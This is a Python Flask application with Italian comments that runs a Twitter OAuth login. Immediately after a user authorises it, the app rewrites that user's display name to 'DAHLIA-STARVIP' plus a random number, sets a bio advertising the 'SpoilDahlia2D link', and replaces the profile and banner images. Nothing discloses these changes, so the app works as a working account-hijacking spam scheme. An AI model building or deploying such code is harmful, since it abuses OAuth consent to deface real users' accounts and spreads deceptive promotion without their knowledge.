import tweepy
import os
import time
import random
from flask import Flask, redirect, request, send_from_directory
from threading import Thread
from dotenv import load_dotenv

# Carica variabili d'ambiente (utile per eseguire in locale)
load_dotenv()

# Configura Flask
app = Flask(__name__)

# Recupera le chiavi API e il token da variabili d'ambiente
API_KEY = os.getenv("API_KEY")
API_SECRET = os.getenv("API_SECRET")
CALLBACK_URL = os.getenv("CALLBACK_URL")

# Variabile globale per il request token
request_token = {}

# Funzione per autenticare con Twitter
def authenticate_twitter(access_token=None, access_secret=None):
    try:
        auth = tweepy.OAuthHandler(API_KEY, API_SECRET)
        if access_token and access_secret:
            auth.set_access_token(access_token, access_secret)
            api = tweepy.API(auth, wait_on_rate_limit=True)
            return api
        else:
            return None
    except tweepy.TweepError as e:
        print(f"❌ Errore autenticazione: {e}")
        return None

# Funzione per aggiornare il profilo Twitter
def update_twitter_profile(access_token, access_secret):
    api = authenticate_twitter(access_token, access_secret)
    if api is None:
        print("❌ Autenticazione fallita. Profilo non aggiornato.")
        return

    try:
        user = api.verify_credentials()
        if not user:
            print("❌ Errore di autenticazione con Twitter.")
            return

        print(f"🔹 Autenticato come {user.screen_name}")

        # Aggiorna il nome e la bio con un numero casuale
        random_number = random.randint(1000, 9999)
        new_name = f"DAHLIA-STARVIP {random_number}"
        new_bio = "I clicked on the SpoilDahlia2D link and now I'm drooling"

        print(f"🔹 Aggiornando nome: {new_name}")
        api.update_profile(name=new_name)
        time.sleep(2)

        print(f"🔹 Aggiornando bio: {new_bio}")
        api.update_profile(description=new_bio)

        # Carica l'immagine del profilo
        profile_image_path = "static/profile.jpg"
        if os.path.exists(profile_image_path):
            print("🔹 Caricamento immagine del profilo...")
            api.update_profile_image(profile_image_path)
            print("✅ Immagine profilo aggiornata!")
        else:
            print("⚠️ Errore: Immagine profilo non trovata!")

        # Carica l'immagine del banner
        banner_image_path = "static/banner.jpg"
        if os.path.exists(banner_image_path):
            print("🔹 Caricamento immagine del banner...")
            api.update_profile_banner(banner_image_path)
            print("✅ Immagine banner aggiornata!")
        else:
            print("⚠️ Errore: Immagine banner non trovata!")

    except tweepy.TweepError as e:
        print(f"❌ Errore API: {e}")
    except Exception as e:
        print(f"❌ Errore generale: {str(e)}")

# Route per autenticare l'utente su Twitter
@app.route("/")
def home():
    try:
        auth = tweepy.OAuthHandler(API_KEY, API_SECRET, CALLBACK_URL)
        redirect_url = auth.get_authorization_url()
        request_token["oauth_token"] = auth.request_token["oauth_token"]
        request_token["oauth_token_secret"] = auth.request_token["oauth_token_secret"]
        
        print(f"🔹 Request Token ottenuto: {auth.request_token}")  # Debug
        return redirect(redirect_url)
    except tweepy.TweepError as e:
        print(f"❌ Errore OAuth: {e}")
        return "Errore nell'autenticazione con Twitter."

# Endpoint per la callback di Twitter
@app.route("/callback")
def twitter_callback():
    oauth_token = request.args.get("oauth_token")
    oauth_verifier = request.args.get("oauth_verifier")

    if not oauth_token or not oauth_verifier:
        return "Errore: Token OAuth non ricevuto."

    auth = tweepy.OAuthHandler(API_KEY, API_SECRET)
    auth.request_token = {
        "oauth_token": request_token["oauth_token"],
        "oauth_token_secret": request_token["oauth_token_secret"],
    }

    try:
        auth.get_access_token(oauth_verifier)
        access_token = auth.access_token
        access_secret = auth.access_token_secret
        print(f"✅ Access Token ottenuto: {access_token[:5]}...")  # Debug

        # 🚀 AGGIORNA SUBITO IL PROFILO QUANDO L'UTENTE ACCETTA!  
        update_twitter_profile(access_token, access_secret)

        return "Autenticazione completata e profilo aggiornato!"
    except tweepy.TweepError as e:
        print(f"❌ Errore durante il recupero del token di accesso: {e}")
        return "Errore nell'autenticazione."

# Endpoint per verificare l'accesso alle immagini
@app.route('/profile-image')
def profile_image():
    return send_from_directory('static', 'profile.jpg')

@app.route('/banner-image')
def banner_image():
    return send_from_directory('static', 'banner.jpg')

# Avvia il server Flask
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
